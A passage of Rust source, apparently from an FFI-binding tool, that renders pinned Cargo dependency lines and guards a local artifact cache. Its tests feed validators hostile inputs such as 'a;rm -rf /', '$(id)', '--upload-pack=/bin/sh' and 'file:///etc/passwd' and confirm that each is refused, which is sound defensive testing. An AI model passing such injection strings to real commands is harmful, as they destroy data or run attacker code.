        /// The exact pinned version (never empty).
        version: CrateVersion,
        /// The enabled features, rendered in this order.
        features: Vec<FeatureName>,
    },
    /// An author-supplied wrapper crate bound by `path`.
    ///
    /// The dependency key is the `[package] name` of the wrapper's own
    /// `Cargo.toml`, carried by the jailed directory, so the key cargo resolves
    /// and the crate it finds at the path cannot disagree.
    Wrapper {
        /// The wrapper directory, proven inside the project root.
        dir: crate::pkginfo::JailedWrapperDir,
        /// The enabled features, rendered in this order.
        features: Vec<FeatureName>,
    },
}

impl CargoDep {
    /// The dependency key.
    #[must_use]
    pub const fn name(&self) -> &PackageName {
        match self {
            Self::Registry { name, .. } => name,
            Self::Wrapper { dir, .. } => dir.package(),
        }
    }

    /// The enabled features.
    #[must_use]
    pub const fn features(&self) -> &[FeatureName] {
        match self {
            Self::Registry { features, .. } | Self::Wrapper { features, .. } => features.as_slice(),
        }
    }

    /// Render the `[dependencies]` line.
    ///
    /// The single renderer: a registry pin is `name = "=VER"` or
    /// `name = { version = "=VER", features = ["a", "b"] }`; a wrapper is
    /// `name = { path = "DIR" }` or `name = { path = "DIR", features = [...] }`.
    #[must_use]
    pub fn render(&self) -> String {
        let quoted: Vec<String> = self
            .features()
            .iter()
            .map(|f| format!("\"{}\"", f.as_str()))
            .collect();
        let name = self.name().as_str();
        match (self, quoted.is_empty()) {
            (Self::Registry { version, .. }, true) => {
                format!("{name} = \"={}\"", version.as_str())
            }
            (Self::Registry { version, .. }, false) => format!(
                "{name} = {{ version = \"={}\", features = [{}] }}",
                version.as_str(),
                quoted.join(", ")
            ),
            (Self::Wrapper { dir, .. }, true) => {
                format!("{name} = {{ path = {} }}", toml_basic_string(dir.as_str()))
            }
            (Self::Wrapper { dir, .. }, false) => format!(
                "{name} = {{ path = {}, features = [{}] }}",
                toml_basic_string(dir.as_str()),
                quoted.join(", ")
            ),
        }
    }

    /// Parse a legacy consumer manifest's stored dependency line.
    ///
    /// Only the exact registry-pin grammar [`CargoDep::render`] emits is
    /// accepted: the parsed value must re-render to the input byte for byte.
    /// A legacy manifest has no inspection document to re-derive a wrapper
    /// crate's source from, so a `path` line has no proof it sits inside the
    /// project and is refused with every other shape.
    ///
    /// # Errors
    ///
    /// [`crate::diag::WireDefect::LegacyDependencyLine`] for any line outside
    /// the grammar, an empty version, or a key, version, or feature failing
    /// its charset gate.
    pub fn parse_registry_line(line: &str) -> Result<Self, crate::diag::WireDefect> {
        let refuse = || crate::diag::WireDefect::LegacyDependencyLine {
            got: line.to_owned(),
        };
        let (name, value) = line.split_once(" = ").ok_or_else(refuse)?;
        let (version, features) = registry_value_parts(value).ok_or_else(refuse)?;
        if version.is_empty() {
            return Err(refuse());
        }
        let dep = Self::Registry {
            name: PackageName::parse(name).map_err(|_| refuse())?,
            version: CrateVersion::parse(version).map_err(|_| refuse())?,
            features: features
                .into_iter()
                .map(|f| FeatureName::parse(f).map_err(|_| refuse()))
                .collect::<Result<Vec<_>, _>>()?,
        };
        if dep.render() == line {
            Ok(dep)
        } else {
            Err(refuse())
        }
    }
}

/// Render `text` as a TOML basic string, quotes included.
///
/// `"` and `\` are backslash-escaped, the named controls use their short
/// escapes, and every other control character (C0, DEL, C1) is a `\uXXXX`
/// escape, so the result parses back to exactly `text` whatever it holds.
fn toml_basic_string(text: &str) -> String {
    use std::fmt::Write as _;
    let mut out = String::with_capacity(text.len().saturating_add(2));
    out.push('"');
    for c in text.chars() {
        match c {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\u{8}' => out.push_str("\\b"),
            '\t' => out.push_str("\\t"),
            '\n' => out.push_str("\\n"),
            '\u{c}' => out.push_str("\\f"),
            '\r' => out.push_str("\\r"),
            c if c.is_control() => {
                let _ = write!(out, "\\u{:04X}", u32::from(c));
            }
            c => out.push(c),
        }
    }
    out.push('"');
    out
}

/// Split a registry-pin value into its version text and quoted feature names.
///
/// `"=VER"` or `{ version = "=VER", features = ["a", "b"] }`; `None` for any
/// other shape.
fn registry_value_parts(value: &str) -> Option<(&str, Vec<&str>)> {
    let bare = value
        .strip_prefix("\"=")
        .and_then(|rest| rest.strip_suffix('"'))
        .map(|version| (version, Vec::new()));
    bare.or_else(|| {
        let body = value.strip_prefix("{ version = \"=")?.strip_suffix("] }")?;
        let (version, features) = body.split_once("\", features = [")?;
        let features = features
            .split(", ")
            .map(|f| f.strip_prefix('"')?.strip_suffix('"'))
            .collect::<Option<Vec<_>>>()?;
        Some((version, features))
    })
}

/// The `[dependencies]` entries a program using this crate's bindings needs.
///
/// One exact pinned version per resolved crate — never a guessed name,
/// never `"*"` — with the effective feature set on the primary crate. A
/// wrapper crate is jailed to `cache`'s project root and bound by its
/// [`crate::pkginfo::JailedWrapperDir`]. Registry pins are sorted by rendered
/// line.
///
/// # Errors
///
/// A dep with no resolved version fails loudly (an unpinned line would be
/// an under-bind waiting to happen); a wrapper crate that does not resolve
/// inside the project root, or to a renderable directory, or whose
/// `Cargo.toml` does not name the installed package, is refused.
pub fn cargo_deps(pkg: &PkgInfo, cache: &FfiCache) -> Result<Vec<CargoDep>, Diagnostic> {
    let missing_version = |name: &str| Diagnostic::WireMalformed {
        context: format!("transitive dep `{name}`"),
        defect: crate::diag::WireDefect::Json {
            detail: "missing resolved version (an unpinned dependency line is forbidden)"
                .to_owned(),
        },
    };
    match pkg.source() {
        // An author-supplied wrapper crate is bound by PATH, never a registry
        // pin: the emitted app crate depends on the local wrapper directory. Its
        // own transitive deps resolve through the wrapper's `Cargo.toml`, so the
        // single path entry is the whole dependency surface the app needs to add.
        crate::pkginfo::PkgSource::Wrapper(path) => {
            let refuse = |defect| Diagnostic::WireMalformed {
                context: format!("wrapper crate `{}`", pkg.name()),
                defect,
            };
            let dir = path.jail(cache.project_root()?).map_err(refuse)?;
            // The Cargo `[dependencies]` KEY is the wrapper's own
            // `[package] name`, which must be the installed package's name: a
            // wrapper edited after install to another name would otherwise bind
            // bindings generated for one crate to a different one.
            if dir.package() != pkg.name_pkg() {
                return Err(refuse(crate::diag::WireDefect::WrapperManifest {
                    got: path.as_str().to_owned(),
                    defect: crate::diag::WrapperManifestDefect::PackageNameMismatch {
                        expected: pkg.name().to_owned(),
                        found: dir.package().as_str().to_owned(),
                    },
                }));
            }
            Ok(vec![CargoDep::Wrapper {
                dir,
                features: pkg.features().to_vec(),
            }])
        }
        crate::pkginfo::PkgSource::Registry if pkg.transitive_deps().is_empty() => {
            // No probe metadata: pin the primary crate from the package header.
            // The dependency KEY is the charset-gated package name, never
            // `pkg_path`.
            if pkg.version().is_empty() {
                return Err(missing_version(pkg.name()));
            }
            Ok(vec![CargoDep::Registry {
                name: pkg.name_pkg().clone(),
                version: pkg.crate_version().clone(),
                features: pkg.features().to_vec(),
            }])
        }
        crate::pkginfo::PkgSource::Registry => {
            let mut deps = Vec::new();
            for dep in pkg.transitive_deps() {
                // The probe scaffold is dropped at the `PkgInfo` decode
                // boundary, so every `TransitiveDep` reaching here is a real
                // registry package.
                if dep.version.is_empty() {
                    return Err(missing_version(dep.name.as_str()));
                }
                // The primary crate carries the effective feature set rustdoc
                // succeeded with. Matched on the REGISTRY package NAME, not the
                // lib ident: a crate whose lib renames its target
                // (`async-stripe` → lib `stripe`) has `dep.ident = "stripe"` but
                // `dep.name = "async-stripe" = pkg.name()`, and the `Cargo.toml`
                // key is the package name — so matching on ident would drop the
                // feature set and ship a manifest missing a mandatory runtime
                // feature (a cargo build-script failure).
                let features = if dep.name.as_str() == pkg.name() {
                    pkg.features().to_vec()
                } else {
                    Vec::new()
                };
                deps.push(CargoDep::Registry {
                    name: dep.name.clone(),
                    version: dep.version.clone(),
                    features,
                });
            }
            deps.sort_by_cached_key(CargoDep::render);
            Ok(deps)
        }
    }
}

/// The rendered `[dependencies]` lines of [`cargo_deps`], in the same order.
///
/// # Errors
///
/// Exactly those of [`cargo_deps`].
pub fn cargo_dep_lines(pkg: &PkgInfo, cache: &FfiCache) -> Result<Vec<String>, Diagnostic> {
    Ok(cargo_deps(pkg, cache)?
        .iter()
        .map(CargoDep::render)
        .collect())
}

// ── S4 sentinel DCE ─────────────────────────────────────────────────────────

/// Text-slice a `_bindings.rs` on the wrapper sentinels, keeping preamble
/// unconditionally and only the REACHED wrapper regions.
///
/// No Rust is parsed. Conservative-keep: anything outside a well-formed
/// BEGIN/END pair (including a malformed region) is kept, so the shake can
/// never under-keep (an under-bind); over-keep is dead code cargo strips.
#[must_use]
pub fn shake_bindings(source: &str, reached: &BTreeSet<String>) -> String {
    let mut out = String::with_capacity(source.len());
    let mut skipping = false;
    for line in source.lines() {
        if let Some(ref_name) = line.trim_end().strip_prefix(WRAPPER_SENTINEL_PREFIX) {
            skipping = !reached.contains(ref_name);
        }
        let is_end = line.trim_end() == WRAPPER_END_SENTINEL;
        if !skipping {
            out.push_str(line);
            out.push('\n');
        }
        if is_end {
            skipping = false;
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    // ── source gates ────────────────────────────────────────────────────

    #[test]
    fn crate_name_gate_kills_shell_shapes() {
        assert!(CrateName::parse("semver").is_ok());
        assert!(CrateName::parse("serde-json").is_ok());
        assert!(CrateName::parse("box_1").is_ok());
        for bad in ["", "a b", "a;rm -rf /", "a$(x)", "名前", "a/b"] {
            assert!(
                matches!(
                    CrateName::parse(bad),
                    Err(Diagnostic::SourceRejected {
                        defect: SourceDefect::CrateNameIllegal,
                        ..
                    })
                ),
                "{bad:?} must be rejected"
            );
        }
    }

    #[test]
    fn git_gate_enforces_scheme_host_allowlist_and_single_pin() {
        let hosts = HostAllowlist::default();
        let none = RawGitPin::default();
        let ok =
            GitSource::parse("https://github.com/acme/mylib", &none, &hosts).expect("accepted");
        assert_eq!(ok.host(), "github.com");
        assert_eq!(*ok.pin(), GitPin::Default);

        let http = GitSource::parse("http://github.com/acme/mylib", &none, &hosts);
        assert!(matches!(
            http,
            Err(Diagnostic::SourceRejected {
                defect: SourceDefect::SchemeNotHttps,
                ..
            })
        ));
        let file = GitSource::parse("file:///etc/passwd", &none, &hosts);
        assert!(matches!(
            file,
            Err(Diagnostic::SourceRejected {
                defect: SourceDefect::SchemeNotHttps,
                ..
            })
        ));
        let evil_host = GitSource::parse("https://evil$host/x", &none, &hosts);
        assert!(matches!(
            evil_host,
            Err(Diagnostic::SourceRejected {
                defect: SourceDefect::HostCharsetIllegal { .. },
                ..
            })
        ));
        let off_list = GitSource::parse("https://example.com/acme/mylib", &none, &hosts);
        assert!(matches!(
            off_list,
            Err(Diagnostic::SourceRejected {
                defect: SourceDefect::HostNotAllowlisted { .. },
                ..
            })
        ));
        let two_pins = RawGitPin {
            rev: Some("abc".into()),
            tag: Some("v1".into()),
            ..RawGitPin::default()
        };
        let multi = GitSource::parse("https://github.com/acme/mylib", &two_pins, &hosts);
        assert!(matches!(
            multi,
            Err(Diagnostic::SourceRejected {
                defect: SourceDefect::MultiplePins { present },
                ..
            }) if present == vec!["rev", "tag"]
        ));
        // An option-shaped pin value can never reach an argv.
        let opt_pin = RawGitPin {
            rev: Some("--upload-pack=/bin/sh".into()),
            ..RawGitPin::default()
        };
        let inj = GitSource::parse("https://github.com/acme/mylib", &opt_pin, &hosts);
        assert!(matches!(
            inj,
            Err(Diagnostic::SourceRejected {
                defect: SourceDefect::PinIllegal { .. },
                ..
            })
        ));
    }

    #[test]
    fn host_allowlist_override_replaces_the_default() {
        let hosts = HostAllowlist::from_override("example.com, github.com");
        assert_eq!(hosts.hosts(), ["example.com", "github.com"]);
        let ok = GitSource::parse(
            "https://example.com/acme/mylib",
            &RawGitPin::default(),
            &hosts,
        );
        assert!(ok.is_ok());
        // Empty override keeps the default.
        assert_eq!(HostAllowlist::from_override("  "), HostAllowlist::default());
    }

    #[test]
    fn inspector_argv_is_typed_and_shell_free() {
        let krate = CrateSpec::parse("semver").expect("legal");
        let hosts = HostAllowlist::default();
        let git = GitSource::parse(
            "https://github.com/acme/semver",
            &RawGitPin {
                tag: Some("v1.0.26".into()),
                ..RawGitPin::default()
            },
            &hosts,
        )
        .expect("accepted");
        let argv = inspector_argv(&krate, &["std".to_owned()], Some(&git), false, false);
        let rendered: Vec<String> = argv
            .iter()
            .map(|a| a.to_string_lossy().into_owned())
            .collect();
        assert_eq!(
            rendered,
            vec![
                "--features",
                "std",
                "--git",
                "https://github.com/acme/semver",
                "--tag",
                "v1.0.26",
                "semver"
            ]
        );
        // The fetch phase prepends `--fetch-only`.
        let fetch = inspector_argv(&krate, &[], None, false, true);
        assert_eq!(
            fetch.first().map(|a| a.to_string_lossy().into_owned()),
            Some("--fetch-only".to_owned())
        );
        assert_eq!(
            fetch.last().map(|a| a.to_string_lossy().into_owned()),
            Some("semver".to_owned())
        );
    }

    #[test]
    fn crate_spec_carries_an_exact_version_pin_and_gates_its_charset() {
        let spec = CrateSpec::parse("async-stripe@=1.0.0-rc.6").expect("legal");
        assert_eq!(spec.name().as_str(), "async-stripe");
        assert_eq!(spec.inspector_arg(), "async-stripe@=1.0.0-rc.6");
        let argv = inspector_argv(&spec, &[], None, false, false);
        assert_eq!(
            argv.last().map(|a| a.to_string_lossy().into_owned()),
            Some("async-stripe@=1.0.0-rc.6".to_owned())
        );
        // The version half is gated to the semver charset — a shell/TOML
        // metacharacter cannot reach the argv.
        for bad in ["stripe@", "stripe@1.0\"", "stripe@$(id)", "@1.0", "a@b@c"] {
            assert!(CrateSpec::parse(bad).is_err(), "{bad} must be rejected");
        }
        // A bare name still parses and renders unversioned.
        let bare = CrateSpec::parse("uuid").expect("legal");
        assert_eq!(bare.inspector_arg(), "uuid");
    }

    // ── cache + artifacts ───────────────────────────────────────────────

    fn semver_json() -> String {
        json!({
            "pkg": "semver",
            "name": "semver",
            "version": "1.0.26",
            "functions": [
                {
                    "name": "parse",
                    "params": [{"name": "text", "type": "String", "ipeType": "String", "rustType": "&str"}],
                    "results": [{"name": "", "type": "Result Error Version", "rustType": "Result<Version, Error>"}],
                    "effect": "fallible"
                },
                {
                    "name": "confused",
                    "effect": "pure",
                    "isField": true,
                    "isEnumCtor": true,
                    "enumVariant": "V",
                    "enumKind": "unit"
                }
            ],
            "errors": [],
            "notes": ["facade guidance"],
            "transitiveDeps": [
                {"ident": "semver", "name": "semver", "version": "1.0.26"},
                {"ident": "serde_json", "name": "serde-json", "version": "1.0.145"}
            ],
            "features": ["std"]
        })
        .to_string()
    }

    fn semver_pkg() -> PkgInfo {
        PkgInfo::decode_json(&semver_json()).expect("decodes")
    }

    /// A cache for registry-only rendering: never consulted for a jail, so
    /// its project root need not exist.
    fn registry_cache() -> FfiCache {
        FfiCache::at_project_root(Path::new("/nonexistent-ipe-project"))
    }

    /// Every artifact path of `paths`, the seven `write_package` writes.
    #[cfg(unix)]
    fn every_artifact(paths: &ArtifactPaths) -> [&Path; 7] {
        [
            &paths.ipei,
            &paths.kernel_json,
            &paths.bindings,
            &paths.coverage,
            &paths.interface,
            &paths.consumer,
            &paths.pkg_json,
        ]
    }

    /// The permission bits granting access to a file's group or to others.
    #[cfg(unix)]
    const GROUP_OR_OTHER: u32 = 0o077;

    /// Whether the entry at `path`, not followed, grants no permission bit outside `allowed`.
    ///
    /// `allowed` is an owner-only mode, so a pass also means nothing is
    /// granted to the entry's group or to others.
    #[cfg(unix)]
    fn within(path: &Path, allowed: u32) -> bool {
        use std::os::unix::fs::PermissionsExt as _;
        const PERMISSION_BITS: u32 = 0o7777;
        let mode = std::fs::symlink_metadata(path)
            .expect("stat")
            .permissions()
            .mode();
        mode & PERMISSION_BITS & !allowed == 0
    }

    /// Whether the directory at `path`, not followed, is within [`PRIVATE_DIR_MODE`].
    #[cfg(unix)]
    fn private_dir(path: &Path) -> bool {
        within(path, PRIVATE_DIR_MODE)
    }

    /// Whether the artifact at `path`, not followed, is within [`PRIVATE_FILE_MODE`].
    #[cfg(unix)]
    fn owner_only(path: &Path) -> bool {
        within(path, PRIVATE_FILE_MODE)
    }

    #[cfg(unix)]
    #[test]
    fn write_package_creates_owner_only_directories_and_artifacts() {
        use std::os::unix::fs::{PermissionsExt as _, symlink};
        assert_eq!(
            PRIVATE_DIR_MODE & GROUP_OR_OTHER,
            0,
            "the directory mode is owner-only"
        );
        assert_eq!(
            PRIVATE_FILE_MODE & GROUP_OR_OTHER,
            0,
            "the artifact mode is owner-only"
        );
        let tmp =
            ipe_test_temp::temp_root().join(format!("ipe-ffi-cache-modes-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&tmp);
        std::fs::create_dir_all(&tmp).expect("scratch project root");
        let cache = FfiCache::at_project_root(&tmp);
        let pkg = semver_pkg();
        let paths = cache.write_package(&pkg, &semver_json()).expect("writes");
        let mut level = tmp.clone();
        for component in FFI_CACHE_COMPONENTS {
            level.push(component);
            assert!(private_dir(&level), "{} is owner-only", level.display());
        }
        for artifact in every_artifact(&paths) {
            assert!(owner_only(artifact), "{} is owner-only", artifact.display());
        }

        std::fs::set_permissions(&paths.bindings, std::fs::Permissions::from_mode(0o644))
            .expect("widen an existing artifact");
        assert!(
            !owner_only(&paths.bindings),
            "control: the widened artifact is not owner-only"
        );
        let outside = tmp.join("outside.json");
        std::fs::write(&outside, "kept").expect("write link target");
        std::fs::remove_file(&paths.pkg_json).expect("remove artifact");
        symlink(&outside, &paths.pkg_json).expect("plant symlink");
        cache.write_package(&pkg, &semver_json()).expect("rewrites");
        for artifact in every_artifact(&paths) {
            assert!(owner_only(artifact), "{} is owner-only", artifact.display());
        }
        assert!(
            std::fs::symlink_metadata(&paths.pkg_json)
                .expect("stat")
                .file_type()
                .is_file(),
            "the planted link is replaced by a regular file"
        );
        assert_eq!(
            std::fs::read_to_string(&outside).expect("read link target"),
            "kept",
            "nothing is written through the planted link"
        );
        let _ = std::fs::remove_dir_all(&tmp);
    }

    /// A fresh scratch directory named for `tag` and this process.
    #[cfg(unix)]
    fn scratch_dir(tag: &str) -> PathBuf {
        let dir = ipe_test_temp::temp_root().join(format!("ipe-ffi-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("scratch directory");
        dir
    }

    /// The entry names under `dir`, sorted; empty when `dir` is absent.
    #[cfg(unix)]
    fn names_under(dir: &Path) -> Vec<String> {
        let mut names: Vec<String> = std::fs::read_dir(dir)
            .map(|entries| {
                entries
                    .map(|entry| {
                        entry
                            .expect("list entry")
                            .file_name()
                            .to_string_lossy()
                            .into_owned()
                    })
                    .collect()
            })
            .unwrap_or_default();
        names.sort();
        names
    }

    #[cfg(unix)]
    #[test]
    fn a_linked_cache_level_never_redirects_a_write_or_a_removal() {
        use std::os::unix::fs::symlink;
        let pkg = semver_pkg();
        let names = ArtifactNames::for_slug(&slugify(pkg.name()));
        for (index, linked) in FFI_CACHE_COMPONENTS.iter().enumerate() {
            let root = scratch_dir(&format!("linked-level-root-{index}"));
            let outside = scratch_dir(&format!("linked-level-outside-{index}"));
            let mut level = root.clone();
            for component in FFI_CACHE_COMPONENTS.iter().take(index) {
                level.push(component);
                std::fs::create_dir(&level).expect("create a real level");
            }
            let mut target = outside.clone();
            for component in FFI_CACHE_COMPONENTS.iter().skip(index.saturating_add(1)) {
                target.push(component);
            }
            std::fs::create_dir_all(&target).expect("the rest of the chain, outside");
            symlink(&outside, level.join(linked)).expect("plant a link at one level");
            let cache = FfiCache::at_project_root(&root);

            let refused = cache.write_package(&pkg, &semver_json());
            assert!(
                matches!(refused, Err(Diagnostic::ArtifactIo { .. })),
                "level {linked}: {refused:?}"
            );
            assert!(
                names_under(&target).is_empty(),
                "level {linked}: nothing is written through the link"
            );

            std::fs::write(target.join(&names.pkg_json), "kept").expect("an outside file");
            let refused = cache.remove_package(&slugify(pkg.name()));
            assert!(
                matches!(refused, Err(Diagnostic::ArtifactIo { .. })),
                "level {linked}: {refused:?}"
            );
            assert_eq!(
                std::fs::read_to_string(target.join(&names.pkg_json)).expect("read outside"),
                "kept",
                "level {linked}: nothing is removed through the link"
            );
            let _ = std::fs::remove_dir_all(&root);
            let _ = std::fs::remove_dir_all(&outside);
        }
    }

    #[cfg(unix)]
    #[test]
    fn a_cache_level_that_is_a_file_refuses_the_write() {
        let root = scratch_dir("file-level");
        std::fs::write(root.join(CACHE_NAMESPACE_DIR), "").expect("a file where a level belongs");
        let refused = FfiCache::at_project_root(&root).write_package(&semver_pkg(), &semver_json());
        assert!(
            matches!(refused, Err(Diagnostic::ArtifactIo { .. })),
            "{refused:?}"
        );
        let _ = std::fs::remove_dir_all(&root);
    }

    /// How many temporary names past the current one a leftover is planted at.
    #[cfg(unix)]
    const PLANTED_TEMPS: u64 = 256;

    #[cfg(unix)]
    #[test]
    fn a_leftover_at_a_temporary_name_is_replaced_never_written_through() {
        use std::os::unix::fs::symlink;
        let root = scratch_dir("stale-temp");
        let outside = root.join("outside.txt");
        std::fs::write(&outside, "kept").expect("write link target");
        let cache = FfiCache::at_project_root(&root);
        let pkg = semver_pkg();
        let paths = cache.write_package(&pkg, &semver_json()).expect("writes");
        let probe = temp_name("probe");
        let current: u64 = probe
            .rsplit('.')
            .nth(1)
            .and_then(|n| n.parse().ok())
            .expect("the temporary name carries its counter");
        let names = ArtifactNames::for_slug(&slugify(pkg.name()));
        let every = [
            &names.ipei,
            &names.kernel_json,
            &names.bindings,
            &names.coverage,
            &names.interface,
            &names.consumer,
            &names.pkg_json,
        ];
        let pid = std::process::id();
        for name in every {
            for next in 1..=PLANTED_TEMPS {
                let temp = format!("{name}.{pid}.{}.tmp", current.saturating_add(next));
                symlink(&outside, cache.root().join(temp)).expect("plant a leftover link");
            }
        }
        cache
            .write_package(&pkg, &semver_json())
            .expect("a leftover at a temporary name does not block the write");
        assert_eq!(
            std::fs::read_to_string(&outside).expect("read link target"),
            "kept",
            "nothing is written through a leftover link"
        );
        for artifact in every_artifact(&paths) {
            assert!(
                std::fs::symlink_metadata(artifact)
                    .expect("stat")
                    .file_type()
                    .is_file(),
                "{} is a regular file",
                artifact.display()
            );
        }
        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn cache_round_trip_writes_and_removes_the_four_artifacts() {
        let tmp =
            ipe_test_temp::temp_root().join(format!("ipe-ffi-cache-test-{}", std::process::id()));
        let cache = FfiCache::at_project_root(&tmp);
        let pkg = semver_pkg();
        let paths = cache.write_package(&pkg, &semver_json()).expect("writes");
        for p in [
            &paths.ipei,
            &paths.kernel_json,
            &paths.bindings,
            &paths.coverage,
        ] {
            assert!(p.is_file(), "{} must exist", p.display());
        }
        let ipei = std::fs::read_to_string(&paths.ipei).expect("readable");
        assert!(ipei.starts_with("module Rust.Semver"));
        let coverage = std::fs::read_to_string(&paths.coverage).expect("readable");
        assert!(coverage.contains("Bound functions: 1"), "{coverage}");
        assert!(coverage.contains("Dropped bindings: 1"), "{coverage}");
        assert!(coverage.contains("contradictory shape flags"), "{coverage}");
        assert!(coverage.contains("facade guidance"), "{coverage}");
        cache.remove_package("semver").expect("removes");
        assert!(!paths.ipei.exists());
        // Idempotent: removing again is fine.
        cache.remove_package("semver").expect("idempotent");
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn install_refuses_a_failed_closed_inspection() {
        let tmp =
            ipe_test_temp::temp_root().join(format!("ipe-ffi-refuse-test-{}", std::process::id()));
        let cache = FfiCache::at_project_root(&tmp);
        let failed = json!({
            "pkg": "semver",
            "name": "semver",
            "functions": [],
            "errors": ["rustdoc failed"]
        })
        .to_string();
        let r = install_from_inspection(&cache, &failed);
        assert!(matches!(r, Err(Diagnostic::WireMalformed { .. })), "{r:?}");
        assert!(
            !cache.root().exists(),
            "a refused install must write nothing"
        );
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn warm_load_re_derives_byte_identical_bindings() {
        // A normal warm build must produce the SAME src/ffi.rs the install
        // wrote — the re-derivation from pkg.json is byte-identical to the
        // emit_bindings output persisted on disk (the SEAL on the warm path).
        let tmp =
            ipe_test_temp::temp_root().join(format!("ipe-ffi-warm-test-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&tmp);
        let cache = FfiCache::at_project_root(&tmp);
        let (_pkg, paths) = install_from_inspection(&cache, &semver_json()).expect("installs");
        let on_disk = std::fs::read_to_string(&paths.bindings).expect("readable");
        let catalog = load_catalog(cache.root()).expect("loads");
        let c = catalog.first().expect("one crate");
        assert_eq!(
            c.bindings_source, on_disk,
            "warm re-derivation must be byte-identical to the installed _bindings.rs"
        );
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn legacy_cache_without_pkg_json_falls_back_to_stored_bindings() {
        // A cache written before the pkg.json artifact existed still loads: the
        // re-derivation gracefully falls back to the stored _bindings.rs text
        // (trust then rests on the discovery ownership gate + the injection-free
        // emitter). Removing pkg.json models the legacy layout.
        let tmp =
            ipe_test_temp::temp_root().join(format!("ipe-ffi-legacy-test-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&tmp);
        let cache = FfiCache::at_project_root(&tmp);
        let (_pkg, paths) = install_from_inspection(&cache, &semver_json()).expect("installs");
        let stored = std::fs::read_to_string(&paths.bindings).expect("readable");
        std::fs::remove_file(&paths.pkg_json).expect("drop pkg.json");
        let catalog = load_catalog(cache.root()).expect("loads legacy layout");
        let c = catalog.first().expect("one crate");
        assert_eq!(
            c.bindings_source, stored,
            "legacy path serves the stored text"
        );
        let _ = std::fs::remove_dir_all(&tmp);
    }

    fn transparent_enum_json() -> String {
        json!({
            "pkg": "tm", "name": "tm", "version": "0.1.0",
            "functions": [
                {"name": "mk",
                 "params": [{"name": "n", "type": "Int", "ipeType": "Int", "rustType": "i64"}],
                 "results": [{"name": "", "type": "Shade", "rustType": "tm::Shade"}],
                 "effect": "pure"}
            ],
            "errors": [],
            "types": [
                {"name": "Shade", "rustPath": "tm::Shade", "kind": "enum",
                 "variants": [
                    {"name": "On", "kind": "unit"},
                    {"name": "Level", "kind": "tuple",
                     "members": [{"name": "0", "type": "Int", "rustType": "i64"}]}
                 ]}
            ]
        })
        .to_string()
    }

    /// A torn legacy projection pair (no `pkg.json`) whose interface text still
    /// surfaces a transparent CLOSED UNION (`type X = … (..)` export) while the
    /// consumer manifest has had `transparentTypes` + the binding markers
    /// stripped must be REFUSED. The lowerer keys transparency on the module
    /// text, so admitting it would emit a native app enum the wrapper's foreign
    /// result never converts to — an E0308 after `ipe` exit 0.
    #[test]
    fn legacy_torn_transparent_union_is_refused() {
        let tmp =
            ipe_test_temp::temp_root().join(format!("ipe-ffi-torn-enum-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&tmp);
        let cache = FfiCache::at_project_root(&tmp);
        let (_pkg, paths) =
            install_from_inspection(&cache, &transparent_enum_json()).expect("installs");
        std::fs::remove_file(&paths.pkg_json).expect("drop pkg.json");
        let consumer = std::fs::read_to_string(&paths.consumer).expect("readable");
        let mut doc: serde_json::Value = serde_json::from_str(&consumer).expect("json");
        if let Some(o) = doc.as_object_mut() {
            o.remove("transparentTypes");
            if let Some(bs) = o.get_mut("bindings").and_then(|b| b.as_array_mut()) {
                for b in bs {
                    if let Some(bo) = b.as_object_mut() {
                        bo.remove("transparentParams");
                        bo.remove("transparentResult");
                    }
                }
            }
        }
        std::fs::write(&paths.consumer, serde_json::to_string_pretty(&doc).unwrap()).expect("w");
        let result = load_catalog(cache.root());
        assert!(
            result.is_err(),
            "torn transparent-union legacy cache must be refused, got: {:?}",
            result.map(|c| c.first().map(|x| x
                .transparent_types
                .keys()
                .cloned()
                .collect::<Vec<_>>()))
        );
        let _ = std::fs::remove_dir_all(&tmp);
    }

    fn transparent_define_json() -> String {
        json!({
            "pkg": "demo", "name": "demo", "version": "0.1.0",
            "functions": [{
                "name": "counter_new", "effect": "pure", "isStructCtor": true,
                "structName": "Counter",
                "structFields": [{ "name": "value", "type": "i64" }],
                "structDerives": ["Clone"]
            }],
            "errors": []
        })
        .to_string()
    }

    /// A transparent DEFINE type survives the legacy (no `pkg.json`) load: the
    /// consumer manifest's `transparentTypes` carries the shape (bare-nominal
    /// `rustPath`, the define convention) and the constructor binding keeps its
    /// result-conversion marker.
    #[test]
    fn legacy_transparent_define_round_trips_through_the_consumer_manifest() {
        let tmp = ipe_test_temp::temp_root()
            .join(format!("ipe-ffi-define-legacy-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&tmp);
        let cache = FfiCache::at_project_root(&tmp);
        let (_pkg, paths) =
            install_from_inspection(&cache, &transparent_define_json()).expect("installs");
        std::fs::remove_file(&paths.pkg_json).expect("drop pkg.json");
        let catalog = load_catalog(cache.root()).expect("loads legacy layout");
        let c = catalog.first().expect("one crate");
        let t = c
            .transparent_types
            .get("Counter")
            .expect("transparent define shape survives");
        assert_eq!(t.rust_path().as_str(), "Counter", "bare define nominal");
        assert!(c.define_types.is_empty(), "{:?}", c.define_types);
        let b = c
            .bindings
            .iter()
            .find(|b| b.ref_name == "counter_new")
            .expect("constructor binding");
        assert_eq!(
            b.transparent_result.as_ref().map(|r| r.type_name.as_str()),
            Some("Counter")
        );
        let _ = std::fs::remove_dir_all(&tmp);
    }

    /// A torn legacy projection whose interface text surfaces a define RECORD
    /// (`type alias …`) while the consumer manifest lost `transparentTypes` is
    /// refused, exactly like the torn transparent-union import — the glue the
    /// backend assembles would be missing while the module still declares the
    /// record as a native app type.
    #[test]
    fn legacy_torn_transparent_define_is_refused() {
        let tmp =
            ipe_test_temp::temp_root().join(format!("ipe-ffi-torn-define-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&tmp);
        let cache = FfiCache::at_project_root(&tmp);
        let (_pkg, paths) =
            install_from_inspection(&cache, &transparent_define_json()).expect("installs");
        std::fs::remove_file(&paths.pkg_json).expect("drop pkg.json");
        let consumer = std::fs::read_to_string(&paths.consumer).expect("readable");
